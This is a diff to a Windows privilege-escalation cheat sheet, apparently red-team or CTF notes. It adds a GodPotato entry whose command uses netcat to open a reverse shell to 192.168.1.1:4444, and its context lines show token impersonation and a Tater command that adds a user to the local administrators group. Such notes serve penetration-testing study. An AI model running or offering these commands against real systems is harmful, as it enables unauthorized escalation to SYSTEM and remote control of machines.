@@ -1,4 +1,4 @@
-# Windows Privilege Escalation
+![image](https://github.com/lw8192/Red-Team-Rising/assets/81585869/1122f6da-b12c-4dd2-be39-a1c0744bc904)# Windows Privilege Escalation
 ## Contents 
 - [Windows Privilege Escalation](#windows-privilege-escalation)
   * [Contents](#contents)
@@ -147,6 +147,10 @@ For most CTFS all you should need is winPEAS
     load incognito    
     list_tokens -u       
     impersonate_token domain\\username   #impersonate a domain user   
+### GodPotato    
+https://github.com/BeichenDream/GodPotato     
+
+    GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.1 4444"
 ### PrintSpoofer 
 SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10.          
 [Print Spoofer](https://github.com/itm4n/PrintSpoofer)       
@@ -165,7 +169,8 @@ Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass po
      Import-Module Tater.ps1 
      Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   
 ### Rotten Potato      
-Works up to Windows 2016 and Windows 10 1803        
+Works up to Windows 2016 and Windows 10 1803     
+
 ### Juicy Potato   
 Look for SeImpersonate or SeAssignPrimaryToken 
 [binaries](https://github.com/ohpe/juicy-potato)  
